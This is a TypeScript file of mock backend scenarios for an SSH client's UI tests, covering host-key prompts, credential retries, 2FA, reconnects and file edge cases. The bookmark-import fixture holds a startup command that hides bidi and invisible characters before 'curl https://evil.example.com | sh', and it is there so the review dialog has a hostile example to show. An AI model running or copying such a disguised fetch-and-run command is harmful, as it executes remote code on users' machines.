// MockBackend scenarios (docs/ARCHITECTURE.md §8.8). Selected with `?scenario=<name>` (default `happy`).
// A scenario is a script that drives the SessionEvent stream the way the real backend would (§5): connect,
// prompts (host key, passphrase, password, keyboard-interactive), failures, drops and reconnects, a terminal flood,
// save conflicts, ...
import type {
  AppError,
  ConfigWarning,
  HopInfo,
  HostKeyVerification,
  ImportInvalid,
  Prompt,
  PromptAnswer,
  SessionEvent,
  SessionInfo,
  TermEvent,
} from "../types";
import type { FakeFs } from "./fakeFs";

export const SCENARIO_NAMES = [
  "happy",
  "hostKeyUnknown",
  "hostKeyChanged",
  "hostKeyChangedNoHint",
  "hostKeyCaManaged",
  "passphraseRetry",
  "passwordRetry",
  "kbdInteractive2fa",
  "dropAfter10s",
  "autoReconnect",
  "reconnectHostKeyMismatch",
  "saveConflict",
  "binaryFile",
  "nonUtf8File",
  "largeFile",
  "sftpUnavailable",
  "uploadConflict",
  "terminalFlood",
  "agentUntrusted",
  "updateAvailable",
  "updateManualDownload",
  "importStartupCommands",
  "configWarnings",
] as const;

export type ScenarioName = (typeof SCENARIO_NAMES)[number];

export function isScenarioName(value: string | null | undefined): value is ScenarioName {
  return (SCENARIO_NAMES as readonly string[]).includes(value ?? "");
}

/** Secrets the scripted server accepts (documented test values, not real credentials). */
export const MOCK_SECRETS = {
  passphrase: "correct-passphrase",
  password: "correct-password",
  verificationCode: "123456",
} as const;

/** What a scenario's session script can do. */
export interface SessionScript {
  sessionId: string;
  /** Pre-built info for a successful connection to the requested host. */
  info: SessionInfo;
  /** Destination hop (what the UI shows while connecting). */
  hop: HopInfo;
  options: { dropAfterMs: number };
  emit(event: SessionEvent): void;
  /** Pause (shortened when the mock runs without artificial latency, i.e. in tests). */
  sleep(ms: number): Promise<void>;
  /** Like `sleep`, but "Reconnect now" ends it early. */
  sleepInterruptible(ms: number): Promise<void>;
  isClosed(): boolean;
  /** Emits a prompt and waits for the answer (`null` when the session was closed meanwhile). */
  ask(prompt: Prompt): Promise<PromptAnswer | null>;
  newPromptId(): string;
  /** `connected` with the given host-key verification. */
  connected(verification?: HostKeyVerification): void;
  /** `disconnected` with an error. */
  fail(error: AppError | null, canRetry?: boolean): void;
  /** Tells open terminals the shell was respawned after a reconnect (§5.8). */
  notifyReconnected(): void;
  /** What the keychain offers for this target (drafts and quick connects never offer it). */
  credentials: { canRemember: boolean; savedPasswordAvailable: boolean };
  /** A remembered password succeeded: the backend persists it BEFORE `connected`. */
  rememberPassword(): void;
}

export interface TerminalScript {
  termId: string;
  emitBytes(bytes: Uint8Array): void;
  emitEvent(event: TermEvent): void;
  /** Produces `bytes` of flood output (default: the mock's `floodBytes`) through the flow-controlled pipeline. */
  flood(bytes?: number): void;
  sleep(ms: number): Promise<void>;
  isClosed(): boolean;
}

export interface ScenarioHooks {
  /** `false` while the scenario is only a name (falls back to `happy` behaviour). */
  implemented: boolean;
  /** Drives the SessionEvent stream after `session_open` (and again on "retry" after a failure). */
  runSession?(script: SessionScript): Promise<void>;
  /** Called after a terminal was opened and its prompt was written (e.g. `terminalFlood`). */
  onTerminalOpened?(script: TerminalScript): void;
  /** `false` makes `sftp_*` commands fail with `sftpUnavailable`. Default true. */
  sftpAvailable?: boolean;
  /** `agent_status` answer override. */
  agentUntrusted?: boolean;
  /**
   * Updater: an update is published. `self` installs itself; `manual` is a Linux .deb/.rpm install that only
   * offers the release page. The automatic check announces it shortly after startup (`update:available`).
   */
  update?: "self" | "manual";
  /** The (mock) keychain already holds a password for every ssh-config / bookmark target. */
  keychainEntries?: boolean;
  /** Adds scenario-specific files to the fake server (binary, non-UTF-8, oversized, crowded folders ...). */
  extraFiles?: (fs: FakeFs) => void;
  /** The first non-forced save of every file finds it changed on the server (`remoteChanged`, §6.4). */
  conflictOnSave?: boolean;
  /** What the native upload picker returns (local file names and sizes); default: one new file. */
  pickedFiles?: readonly { name: string; size: number }[];
  /** The file the bookmark import "picks" (default: one plain bookmark). */
  importFile?: MockImportFile;
  /** Load warnings of the ssh config snapshot (and the `badLine` warnings dropped by the per-file cap). */
  sshConfigWarnings?: { warnings: ConfigWarning[]; droppedWarnings: number };
}

/** A bookmark import file as the mock's native dialog reads it (already parsed; `invalid` = parse-stage rejections). */
export interface MockImportFile {
  bookmarks: { name: string; host: string; user?: string; startupCommand?: string }[];
  invalid?: ImportInvalid[];
}

// Hostile characters are built from code points so no invisible character sits in this source.
const RLO = String.fromCodePoint(0x202e);
const ZWSP = String.fromCodePoint(0x200b);

const hopRef = (hop: HopInfo) => ({ index: hop.index, label: hop.label, user: hop.user, host: hop.host, port: hop.port });
const authFailed = (s: SessionScript, tried: ("publickey" | "password" | "keyboardInteractive")[]): AppError => ({
  code: "authFailed",
  params: { user: s.hop.user, host: s.hop.host, tried, serverMethods: ["publickey", "password", "keyboardInteractive"] },
});

async function connecting(s: SessionScript): Promise<boolean> {
  s.emit({ type: "state", state: { phase: "connecting", hop: hopRef(s.hop) } });
  await s.sleep(120);
  return !s.isClosed();
}

async function authenticating(s: SessionScript): Promise<boolean> {
  s.emit({ type: "state", state: { phase: "authenticating", hop: hopRef(s.hop) } });
  await s.sleep(120);
  return !s.isClosed();
}

/** `happy`: connecting -> authenticating -> connected. */
async function happyScript(s: SessionScript): Promise<void> {
  if (!(await connecting(s)) || !(await authenticating(s))) return;
  s.connected();
}

/** Connect then, after `dropAfterMs`, lose the connection and run the reconnect sequence (§5.8). */
async function reconnectCycle(s: SessionScript, outcome: "recovers" | "hostKeyMismatch"): Promise<void> {
  await s.sleep(s.options.dropAfterMs);
  if (s.isClosed()) return;
  const cause: AppError = { code: "disconnected", params: { reason: "keepaliveTimeout", message: null } };
  const waiting = (attempt: number, waitMs: number): SessionEvent => ({
    type: "state",
    state: {
      phase: "reconnecting",
      stage: "waiting",
      hop: null,
      attempt,
      maxAttempts: 5,
      nextAttemptAtMs: Date.now() + waitMs,
      cause,
    },
  });
  const stage = (st: "connecting" | "authenticating", attempt: number): SessionEvent => ({
    type: "state",
    state: { phase: "reconnecting", stage: st, hop: hopRef(s.hop), attempt, maxAttempts: 5, nextAttemptAtMs: null, cause },
  });

  s.emit(waiting(1, 1000));
  await s.sleepInterruptible(1000);
  if (s.isClosed()) return;
  s.emit(stage("connecting", 1));
  await s.sleep(150);
  if (outcome === "hostKeyMismatch") {
    s.fail(
      {
        code: "hostKeyMismatchOnReconnect",
        params: {
          host: s.hop.host,
          port: s.hop.port,
          expected: s.hop.hostKey.fingerprint,
          actual: "SHA256:aDifferentKeyThatIsNotInKnownHostsAndNotPinned0000",
        },
      },
      false,
    );
    return;
  }
  // First attempt fails (refused), second succeeds: shows "attempt 2 of 5" like the mockup.
  s.emit(waiting(2, 2000));
  await s.sleepInterruptible(2000);
  if (s.isClosed()) return;
  s.emit(stage("connecting", 2));
  await s.sleep(150);
  s.emit(stage("authenticating", 2));
  await s.sleep(150);
  if (s.isClosed()) return;
  s.connected();
  s.notifyReconnected();
}

async function hostKeyUnknownScript(s: SessionScript): Promise<void> {
  if (!(await connecting(s))) return;
  const known = s.hop.port === 22 ? s.hop.host : `[${s.hop.host}]:${s.hop.port}`;
  const answer = await s.ask({
    kind: "hostKeyUnknown",
    id: s.newPromptId(),
    hop: hopRef(s.hop),
    knownHostsName: known,
    keyType: "ssh-ed25519",
    fingerprint: s.hop.hostKey.fingerprint,
    knownHostsFile: "~/.ssh/known_hosts",
    otherKeyTypesKnown: [],
    canRemember: true,
  });
  if (!answer || s.isClosed()) return;
  if (answer.kind !== "hostKey" || !answer.accept) {
    s.fail({ code: "hostKeyRejected", params: { host: s.hop.host, port: s.hop.port } }, true);
    return;
  }
  if (!(await authenticating(s))) return;
  s.connected("userConfirmed");
}

async function hostKeyFatalScript(s: SessionScript, kind: "changed" | "changedNoHint" | "caManaged"): Promise<void> {
  if (!(await connecting(s))) return;
  const { host, port } = s.hop;
  const fingerprint = s.hop.hostKey.fingerprint;
  if (kind === "changed" || kind === "changedNoHint") {
    // The backend builds the command (real lookup name, quoted for the local shell); `null` when a name or
    // path cannot be shown safely.
    const lookup = port === 22 ? host : `[${host}]:${port}`;
    const file = "~/.ssh/known_hosts";
    s.fail(
      {
        code: "hostKeyChanged",
        params: {
          host,
          port,
          keyType: "ssh-ed25519",
          fingerprint,
          knownHostsFile: file,
          line: 7,
          removeHint: kind === "changed" ? `ssh-keygen -R '${lookup}' -f '${file}'` : null,
          removeHintShell: "powershell",
        },
      },
      false,
    );
  } else {
    s.fail({ code: "hostKeyCaManaged", params: { host, port, fingerprint, knownHostsFile: "~/.ssh/known_hosts", line: 3 } }, false);
  }
}

/** Passphrase prompt with retries (§5.6): 3 local tries, `lastError`, skip, cancel. */
async function passphraseScript(s: SessionScript): Promise<void> {
  if (!(await connecting(s)) || !(await authenticating(s))) return;
  let attemptsLeft = 3;
  let lastError: "passphraseIncorrect" | null = null;
  for (;;) {
    const answer = await s.ask({
      kind: "passphrase",
      id: s.newPromptId(),
      hop: hopRef(s.hop),
      keyPath: "~/.ssh/id_ed25519",
      attemptsLeft,
      lastError,
      agentAvailable: true,
      addToAgentSupported: true,
      addToAgentDefault: false,
    });
    if (!answer || s.isClosed()) return;
    if (answer.kind === "cancel") return s.fail({ code: "cancelled" }, true);
    if (answer.kind === "skip") return s.fail(authFailed(s, ["publickey"]), true);
    if (answer.kind === "passphrase" && answer.passphrase === MOCK_SECRETS.passphrase) {
      if (answer.addToAgent) s.emit({ type: "warning", warning: { code: "agentConstraintUnsupported" } });
      s.connected();
      return;
    }
    attemptsLeft -= 1;
    lastError = "passphraseIncorrect";
    if (attemptsLeft <= 0) {
      s.emit({ type: "warning", warning: { code: "passphraseIncorrect", params: { path: "~/.ssh/id_ed25519" } } });
      return s.fail(authFailed(s, ["publickey"]), true);
    }
  }
}

/** Password prompt with retries; "use saved password" succeeds (§5.6). */
async function passwordScript(s: SessionScript, withWarning = false): Promise<boolean> {
  if (!(await connecting(s))) return false;
  if (withWarning) s.emit({ type: "warning", warning: { code: "agentUntrusted" } });
  if (!(await authenticating(s))) return false;
  let attemptsLeft = 3;
  let lastError: "passwordIncorrect" | null = null;
  for (;;) {
    const answer = await s.ask({
      kind: "password",
      id: s.newPromptId(),
      hop: hopRef(s.hop),
      user: s.hop.user,
      host: s.hop.host,
      attemptsLeft,
      lastError,
      canRemember: s.credentials.canRemember,
      savedPasswordAvailable: s.credentials.savedPasswordAvailable,
      serverLabel: null,
    });
    if (!answer || s.isClosed()) return false;
    if (answer.kind === "cancel") {
      s.fail({ code: "cancelled" }, true);
      return false;
    }
    if (answer.kind === "useSavedPassword" && s.credentials.savedPasswordAvailable) return true;
    if (answer.kind === "password" && answer.password === MOCK_SECRETS.password) {
      if (answer.remember && s.credentials.canRemember) s.rememberPassword();
      return true;
    }
    attemptsLeft -= 1;
    lastError = "passwordIncorrect";
    if (attemptsLeft <= 0) {
      s.fail(authFailed(s, ["password"]), true);
      return false;
    }
  }
}

async function passwordRetryScript(s: SessionScript): Promise<void> {
  if (await passwordScript(s)) s.connected();
}

/** Password, then a keyboard-interactive verification-code round (2FA, ≤ 3 tries). */
async function kbdScript(s: SessionScript): Promise<void> {
  if (!(await passwordScript(s))) return;
  for (let tries = 0; tries < 3; tries += 1) {
    const answer = await s.ask({
      kind: "keyboardInteractive",
      id: s.newPromptId(),
      hop: hopRef(s.hop),
      name: "Two-factor authentication",
      instructions: "Enter the code from your authenticator app.",
      fields: [{ label: "Verification code:", echo: true }],
    });
    if (!answer || s.isClosed()) return;
    if (answer.kind === "cancel") return s.fail({ code: "cancelled" }, true);
    if (answer.kind === "keyboardInteractive" && answer.responses[0] === MOCK_SECRETS.verificationCode) {
      s.connected();
      return;
    }
  }
  s.fail(authFailed(s, ["password", "keyboardInteractive"]), true);
}

const implemented = (runSession: (s: SessionScript) => Promise<void>, extra: Partial<ScenarioHooks> = {}): ScenarioHooks => ({
  implemented: true,
  runSession,
  ...extra,
});

const happy = implemented(happyScript);
export const SCENARIOS: Record<ScenarioName, ScenarioHooks> = {
  happy,
  hostKeyUnknown: implemented(hostKeyUnknownScript),
  hostKeyChanged: implemented((s) => hostKeyFatalScript(s, "changed")),
  hostKeyChangedNoHint: implemented((s) => hostKeyFatalScript(s, "changedNoHint")),
  hostKeyCaManaged: implemented((s) => hostKeyFatalScript(s, "caManaged")),
  passphraseRetry: implemented(passphraseScript),
  passwordRetry: implemented(passwordRetryScript, { keychainEntries: true }),
  kbdInteractive2fa: implemented(kbdScript),
  dropAfter10s: implemented(async (s) => {
    await happyScript(s);
    await reconnectCycle(s, "recovers");
  }),
  reconnectHostKeyMismatch: implemented(async (s) => {
    await happyScript(s);
    await reconnectCycle(s, "hostKeyMismatch");
  }),
  // Same loss and recovery sequence as dropAfter10s, named for the auto-reconnect UI (waiting -> connecting ->
  // authenticating -> connected; terminals get `reconnected`, SFTP is re-initialised, queued saves run).
  autoReconnect: implemented(async (s) => {
    await happyScript(s);
    await reconnectCycle(s, "recovers");
  }),
  saveConflict: implemented(happyScript, { conflictOnSave: true }),
  binaryFile: implemented(happyScript, { extraFiles: (fs) => fs.addBinary("/srv/app/data.bin") }),
  nonUtf8File: implemented(happyScript, {
    extraFiles: (fs) => {
      // "Привіт, світ" (Cyrillic) as it reads once decoded with windows-1251.
      fs.addEncoded("/srv/app/legacy-cp1251.txt", "Привіт, світ\n", "windows-1251");
      fs.addEol("/srv/app/windows.ini", "[main]\nkey=1\n", "crlf");
      fs.addEol("/srv/app/mixed.txt", "one\ntwo\n", "lf", true);
    },
  }),
  largeFile: implemented(happyScript, {
    extraFiles: (fs) => {
      fs.addHuge("/srv/app/huge.log");
      fs.addCrowdedDir("/srv/app/many", 3000);
    },
  }),
  sftpUnavailable: implemented(happyScript, { sftpAvailable: false }),
  uploadConflict: implemented(happyScript, {
    pickedFiles: [
      { name: "notes.txt", size: 12_000 },
      { name: "deploy.sh", size: 2048 },
      { name: "README.md", size: 900 },
    ],
  }),
  // A burst far larger than the 4 MiB ack window + 8 MiB backlog: the backlog overflows and the frontend gets
  // `outputDropped` once it has caught up (§4.5).
  terminalFlood: implemented(happyScript, {
    onTerminalOpened: (t) => {
      void (async () => {
        await t.sleep(30);
        if (t.isClosed()) return;
        t.flood();
      })();
    },
  }),
  agentUntrusted: implemented(
    async (s) => {
      if (await passwordScript(s, true)) s.connected();
    },
    { agentUntrusted: true },
  ),
  updateAvailable: implemented(happyScript, { update: "self" }),
  updateManualDownload: implemented(happyScript, { update: "manual" }),
  // File > Import bookmarks: the picked file has startup commands, one for a name that already exists ("pi-home")
  // and one hostile (bidi / invisible characters, markup), so the review dialog has something to show.
  importStartupCommands: implemented(happyScript, {
    importFile: {
      bookmarks: [
        { name: "deploy-box", host: "deploy.example.com", user: "deploy", startupCommand: "cd /srv/app && ./status.sh" },
        { name: "pi-home", host: "pi.example.com", user: "pi", startupCommand: "htop" },
        { name: `<b>evil${RLO}box</b>`, host: "evil.example.com", startupCommand: `echo ok${RLO}${ZWSP}; curl https://evil.example.com | sh` },
        { name: "plain-box", host: "plain.example.com" },
      ],
      invalid: [{ entry: "bookmark", index: 4, field: "host", code: "missing" }],
    },
  }),
  // The ssh config has load warnings (Welcome > Config > "N warnings"): a file-level one (line 0), a hostile file
  // name and Match criteria (bidi / invisible characters, markup), and a junk file that hit the cap of 50 per file.
  configWarnings: implemented(happyScript, {
    sshConfigWarnings: {
      warnings: [
        { location: { file: "~/.ssh/config", line: 12 }, code: "badLine", params: { text: "port" } },
        { location: { file: "~/.ssh/config", line: 30 }, code: "unsupportedMatchCriteria", params: { criteria: `exec${RLO}lla` } },
        { location: { file: "~/.ssh/config", line: 31 }, code: "proxyCommandUnsupported", params: { alias: "legacy-box" } },
        {
          location: { file: `~/.ssh/config.d/<b>evil${RLO}${ZWSP}.conf`, line: 0 },
          code: "untrustedFile",
          params: { file: `~/.ssh/config.d/<b>evil${RLO}${ZWSP}.conf` },
        },
        ...Array.from({ length: 50 }, (_, i): ConfigWarning => ({
          location: { file: "~/.ssh/config.d/junk.conf", line: i + 1 },
          code: "badLine",
          params: { text: "?" },
        })),
      ],
      droppedWarnings: 1234,
    },
  }),
};

/** Hooks for `name`; unimplemented scenarios behave like `happy`. */
export function resolveScenario(name: ScenarioName): ScenarioHooks {
  const hooks = SCENARIOS[name];
  return hooks.implemented ? hooks : { ...happy, implemented: false };
}

export function scenarioFromSearch(search: string): ScenarioName {
  const value = new URLSearchParams(search).get("scenario");
  return isScenarioName(value) ? value : "happy";
}
